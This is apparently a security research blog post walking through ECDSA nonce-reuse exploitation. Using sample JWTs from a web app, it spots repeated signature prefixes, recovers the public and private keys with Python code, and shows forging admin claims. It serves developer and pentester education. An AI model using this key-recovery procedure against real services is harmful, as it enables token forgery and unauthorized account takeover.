---
layout: post
title: ECDSA Nonce Reuse
tags: [Research]
author: mqt @ Ingredous Labs
comment: true
---

## Preface

Disclaimer: The information presented in this blog post is not novel research, but rather a writeup demonstrating the attack. The goal of this post is to help developers and pentesters alike to be aware of this vulnerability. Furthermore instructions are provided on how to help spot this flaw and leverage exploitation by using a realistic black-box scenario involving a web application.

[ECDSA Nonce Reuse gained a lot of traction when researchers leveraged this technique to be able to bypass the code signing verification process on Sony's Playstation 3 Consoles.](https://youtu.be/84WI-jSgNMQ?t=330) As Sony was using the same static nonce value to sign the firmware, the researchers were able to extract the ECDSA Private Key and as such sign their own binaries thus allowing the binaries to be ran on the Playstation 3. Recently this technique has been getting a lot of attention due to the various digital currencies which employ ECDSA as the cryptographic algorithm.

Please note this fatal flaw does not stem from ECDSA itself, but rather an incorrect implementation of it. As such, the old adage appears to be true in that whenever a developer tries to roll their own crypto, problems seem to always arise.

## ECDSA Crash Course

ECDSA aka Elliptic Curve Digital Signature Algorithm is an asymmetric encryption algorithm meaning it possesses both a public key and a private key. The private key is typically used to sign a message, while the \public key is used to verify that the message was signed by the respective private key. Compared to its older 'brother' RSA, ECDSA is less widely used. One benefit of using ECDSA compared to RSA is that its signatures are shorter and have the same security strength. 

To learn more how ECDSA works under the hood, it is highly recommended to read this [wonderful resource](https://cryptobook.nakov.com/digital-signatures/ecdsa-sign-verify-messages).

## Realistic Proof of Concept

This proof of concept will demonstrate a scenario in which a web application is using a flawed implementation of ECDSA to sign a JWT. The claims within the JWT are used to identify the user. 

Here is an example of how the claims in the payload will appear:

```
{
	"username": "maxim",
	"email": "maxim@localhost"
}
```

As mentioned before, the web application is using a vulnerable implementation of ECDSA when signing the JWT token. In this case, the flaw is that a static nonce is re-used to sign the JWT. 

First, the user successfully authenticates with the application in which the following session cookie is set. The value of the cookie is:

```
eyJhbGciOiJFUzI1NiJ9.eyJ1c2VybmFtZSI6Im1heGltIiwiZW1haWwiOiJtYXhpbUBsb2NhbGhvc3QifQ.RGt0uId-XGgJxQz6jWkHj4m79HaRY2vz62DktiaOViugICZD_ZBEmlQQCAx7cY-qczFzw6s8odNVL9P-Za6xrQ
```

As this appears to be a JWT, it can be used with a JWT debugger such as [jwt.io](https://jwt.io) to learn more about how the JWT was constructed:

![Screenshot]({{ site.baseurl }}/images/posts/2020/ecdsa/jwt-debugged.png)

Shown in the header section, `ES256` is the algorithm which was used to sign the JWT. As you might've guessed it, `ES256` is `SHA256 with ECDSA` meaning that the JWT header and payload were first hashed using SHA256 and then signed using the ECDSA algorithm.

Take a note of the signature in the JWT as it will come in handy later:

```
RGt0uId-XGgJxQz6jWkHj4m79HaRY2vz62DktiaOViugICZD_ZBEmlQQCAx7cY-qczFzw6s8odNVL9P-Za6xrQ
```

In order to verify ECDSA is using the same nonce to sign messages, you will need another sample from the application. In this scenario, another JWT can be achieved by 
using the web application's self-sign up functionality and registering another user. Then authenticating with that user yielding another JWT:

```
eyJhbGciOiJFUzI1NiJ9.eyJ1c2VybmFtZSI6InJhbmRvbSIsImVtYWlsIjoicmFuZG9tQGxvY2FsaG9zdCJ9.RGt0uId-XGgJxQz6jWkHj4m79HaRY2vz62DktiaOViugtCKcpoypvPC7GrUY9j6M4ZNRRvo47TZbCPhscHU-Wg
```

Notice anything interesting? The first part of both signatures are the same value:

```
RGt0uId-XGgJxQz6jWkHj4m79HaRY2vz62DktiaOViug
```

**This is an indicator that the same nonce is being used to sign messages!**

In order to exploit this, first the respective public key associated with these signatures needs to be derived. The Public Key can actually be recovered from the signature itself and involves a fairly trivial reversing process coupled with using two Python libraries which will handle the majority of the heavy lifting.

Here are the steps:
1. Split the JWT into its three respective parts by using the `.` as a delimeter. 
2. Retrieve the header and data (payload) values and generate a SHA256 digest using them. Return the bytes digest as a long (as that's what the library in the next step will expect.)
3. Using the [python-ecdsa](https://github.com/tlsfuzzer/python-ecdsa) library, instantiate a Signature object.
4. Call the `recover_public_keys()` [method](https://github.com/tlsfuzzer/python-ecdsa/blob/master/src/ecdsa/ecdsa.py#L94) on the Signature object.
5. Verify at least one of the public keys (the method returns two public keys) works with verifying both JWT signatures.
6. Use the [ecdsa-key-recovery](https://github.com/tintinweb/ecdsa-private-key-recovery) library to recover the Private Key.

Lets start by using the first JWT obtained from the web application:

```
eyJhbGciOiJFUzI1NiJ9.eyJ1c2VybmFtZSI6Im1heGltIiwiZW1haWwiOiJtYXhpbUBsb2NhbGhvc3QifQ.RGt0uId-XGgJxQz6jWkHj4m79HaRY2vz62DktiaOViugICZD_ZBEmlQQCAx7cY-qczFzw6s8odNVL9P-Za6xrQ
```

Step 1 - Split the JWT into its three respective parts:

```python3
header = 'eyJhbGciOiJFUzI1NiJ9'
payload = 'eyJ1c2VybmFtZSI6InJhbmRvbSIsImVtYWlsIjoicmFuZG9tQGxvY2FsaG9zdCJ9'
signature = 'RGt0uId-XGgJxQz6jWkHj4m79HaRY2vz62DktiaOViugtCKcpoypvPC7GrUY9j6M4ZNRRvo47TZbCPhscHU-Wg'
```

Step 2 - hashing the header and payload using SHA256:

```python
from Crypto.Util.number import bytes_to_long
from hashlib import sha256
header = 'eyJhbGciOiJFUzI1NiJ9'
payload = 'eyJ1c2VybmFtZSI6InJhbmRvbSIsImVtYWlsIjoicmFuZG9tQGxvY2FsaG9zdCJ9'
bytes_to_long(sha256(f"{header}.{payload}".encode()).digest())

>>> 107606344816097082653668281381475381292883269944958848528295251319167973024164
```

Step 3 - using the python-ecdsa library to instantiate a Signature object.

Looking in the code, it appears the constructor expects two ints, `r` and `s`:

```python
 """
    ECDSA signature.
    :ivar int r: the ``r`` element of the ECDSA signature
    :ivar int s: the ``s`` element of the ECDSA signature
    """

    def __init__(self, r, s):
        self.r = r
        self.s = s
```

To retrieve these values, the JWT signature needs to be base64 decoded and needs to be converted to a long:

**Note**: If you get an incorrect padding error, pad it with `=` until it works. The amount of `=` won't make a difference. However to do it the more 'legit' way, check the amount of characters in the signature and then pad it with `=` until it's divisible by 4:

```
len('RGt0uId-XGgJxQz6jWkHj4m79HaRY2vz62DktiaOViugICZD_ZBEmlQQCAx7cY-qczFzw6s8odNVL9P-Za6xrQ')
>>> 86 # thus requiring two = to be padded
```

```python
from ecdsa.ecdsa import Signature
import base64
from Crypto.Util.number import bytes_to_long

sig_decoded = bytes_to_long(base64.urlsafe_b64decode('RGt0uId-XGgJxQz6jWkHj4m79HaRY2vz62DktiaOViugICZD_ZBEmlQQCAx7cY-qczFzw6s8odNVL9P-Za6xrQ=='))
sig = Signature(sig_decoded >> 256, sig_decoded % 2**256)
sig
>>> <ecdsa.ecdsa.Signature object at 0x10907f430>
```

Step 4 - Now that the Signature object has been instantiated, it is time to derive the public keys.

The `recover_public_keys()` method requires the hash (which was the long value generated in Step 2), and a generator object.

```
from ecdsa.ecdsa import generator_256

keys = sig.recover_public_keys(107606344816097082653668281381475381292883269944958848528295251319167973024164, generator_256)
keys
>>> [<ecdsa.ecdsa.Public_key object at 0x10907f0d0>, <ecdsa.ecdsa.Public_key object at 0x108ae1f70>]
```

As shown above, an array of two Public Key objects are returned.

Step 5 - Verify that at least one of the Public Keys works with verifying both JWT signatures.

In this step, we will need to repeat Step 3 using JWT #2 in order to instantiate a second signature object.

```
eyJhbGciOiJFUzI1NiJ9.eyJ1c2VybmFtZSI6InJhbmRvbSIsImVtYWlsIjoicmFuZG9tQGxvY2FsaG9zdCJ9.RGt0uId-XGgJxQz6jWkHj4m79HaRY2vz62DktiaOViugtCKcpoypvPC7GrUY9j6M4ZNRRvo47TZbCPhscHU-Wg
```

```
sig_decoded_2 = bytes_to_long(base64.urlsafe_b64decode('RGt0uId-XGgJxQz6jWkHj4m79HaRY2vz62DktiaOViugtCKcpoypvPC7GrUY9j6M4ZNRRvo47TZbCPhscHU-Wg=='))
sig2 = Signature(sig_decoded_2 >> 256, sig_decoded_2 % 2**256) 
```

With the second signature object created, we will need to repeat Step 2 to generate the `msghash` for JWT #2 (as it will be required by the verification method):

```python
header = 'eyJhbGciOiJFUzI1NiJ9' 
payload = 'eyJ1c2VybmFtZSI6InJhbmRvbSIsImVtYWlsIjoicmFuZG9tQGxvY2FsaG9zdCJ9'
bytes_to_long(sha256(f"{header}.{payload}".encode()).digest())
>>> 65490965914125282845354934350820906131343154390672003299727997819010148559345
```

Before moving further, lets reiterate all the values we have:

```
msghash_1 = 107606344816097082653668281381475381292883269944958848528295251319167973024164
msghash_2 = 65490965914125282845354934350820906131343154390672003299727997819010148559345

sig # Signature object for JWT #1
sig_2 # Signature object for JWT #2
keys # array of public keys
```

Looking in the `python-ecdsa` code, there is an instance method belonging to the `Public_key` class called `verifies`:

```python
def verifies(self, hash, signature):
			"""Verify that signature is a valid signature of hash.
			Return True if the signature is valid.
			"""
```

Lets try using the first key generated to verify the msghash and signature of the first JWT.

```python
keys[0].verifies(msghash_1, sig)
>>> True	
```

Awesome it works, which is not too surprising as these instances of the message hash and signature were used to derive the public keys. Now the final test is verifying whether the public key verifies the second message hash and its respective signature.

```python
keys[0].verifies(msghash_2, sig2)
>>> False
```

Hmm it does not work, not good. Before going into panic mode, lets use the second Public Key in the array to verify both sets of message hashes and signatures once more.

```python
keys[1].verifies(msghash_1, sig)
>>> True
```

```python
keys[1].verifies(msghash_2, sig2)
>>> True
```

Perfect looks like the second Public Key in the array is able to verify both JWT signatures! 

To make it easier to remember, we assign the value of the second index in the `keys` array to a variable called `pubkey`:

```python
pubkey = keys[1]
```

Step 6 - Use the [ecdsa-key-recovery](https://github.com/tintinweb/ecdsa-private-key-recovery) library to recover the Private Key.

Reviewing the `README` in the `ecdsa-key-recovery` libraries' Github Repo, instructions are shown on how to use the dependency:

```
sampleA = EcDsaSignature(r, sA, hashA, pubkey, curve)
sampleB = EcDsaSignature(r, sB, hashB, pubkey, curve) # same privkey as sampleA, identical r due to nonce reuse k.
```

**Disclaimer, there is a small error and the actual API call looks the following:**

```python
sampleA = EcDsaSignature((r, sA), hashA, pubkey, curve)
sampleB = EcDsaSignature((r, sB), hashB, pubkey, curve) # same privkey as sampleA, identical r due to nonce reuse k.
```

With that being said, lets plugin in the variables:

```python
sampleA = EcDsaSignature((sig.r, sig.s), msghash_1, pubkey, ecdsa.NIST256p)
sampleB = EcDsaSignature((sig2.r, sig2.s), msghash_2, pubkey, ecdsa.NIST256p)
```

Note: If you may be wondering where the constant came from which defines the curve, it was defined in the `python-ecdsa` library:

[https://github.com/tlsfuzzer/python-ecdsa/blob/master/src/ecdsa/curves.py#L333](https://github.com/tlsfuzzer/python-ecdsa/blob/master/src/ecdsa/curves.py#L333)

With both `sampleA` and `sampleB` objects instantiated, the `recover_nonce_reuse()` method can now be called:

```python
recovered = sampleA.recover_nonce_reuse(sampleB)
```

To verify the private key was successfully recovered, we can call the `privkey` attribute on the recovered object;

```python
recovered.privkey
>>> <ecdsa.ecdsa.Private_key object at 0x104aa1e20>
```

Awesome the `privkey` attribute contains an instance of an ECDSA Private Key object.

The final verification step is to use the recovered private key to sign a message and ensure it can be verified with the public key.

```python
msg = 'does this work'
k = 12345 # nonce
msghash = sha256(msg.encode()).digest()
sig = recovered.privkey.sign(bytes_to_long(msghash), k)
pubkey.verifies(bytes_to_long(msg_hash), sig)
>>> True
```

Perfect the signature signed using the recovered private key is able to be verified with the derived public key.

In the case of the web application, the attacker would now be able to mint a new JWT with modified claims and gain access to the application as a highly privileged user, e.g:

```
{
	"username": "admin",
	"email": "admin@localhost"
}
```

### Conclusion

A great way to end the blog post is by reiterating that this isn't a flaw within the ECDSA algorithm itself but rather a flawed implementation of it. In this scenario it occurred due to the developer attempting to roll their own crypto (as sometimes it may seem as simple as plugging variables into a formula). Typically by using tried and true dependencies, a developer is able to relieve the responsibility of correctly implementing the respective algorithm. However be note, even in the case where a trusted library such as one that's packaged with the programming language otherwise known as a standard library, can contain flaws. [In April it was discovered that Java suffered a critical vulnerability](https://www.cryptomathic.com/news-events/blog/explaining-the-java-ecdsa-critical-vulnerability) where its ECDSA signature verification algorithm was flawed thus allowing an attacker to trivially construct an ECDSA signature which would always be successfully validated. The reason this happened was due to the ECDSA code being rewritten for the Java 15 release. 

To provide a quick TL;DR about this post for pentesters - in a black-box engagement, if the application is discovered to be using ECDSA as a signing algorithm, collect a sample of signatures and ensure they don't each start with the same pattern.

Thanks for reading.